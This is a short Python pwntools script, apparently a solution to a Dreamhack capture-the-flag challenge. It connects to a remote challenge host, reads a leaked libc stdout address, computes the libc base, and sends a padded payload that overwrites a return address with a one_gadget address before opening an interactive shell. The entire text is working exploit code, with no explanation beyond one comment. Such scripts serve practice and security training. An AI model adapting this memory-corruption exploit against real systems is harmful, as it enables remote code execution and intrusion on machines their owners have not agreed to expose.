from pwn import *

r = remote("host8.dreamhack.games", 10592)
libc = ELF('./libc.so.6')

#caculate libc base
r.recvuntil("stdout: ")
stdout = int(r.recvline(),16)
libc_base = stdout - libc.symbols['_IO_2_1_stdout_']

one_gadget = libc_base + 0x45216

payload = b'\x00' * 0x20 + b'A' * 8 + p64(one_gadget)
r.sendlineafter("MSG: ", payload)

r.interactive()

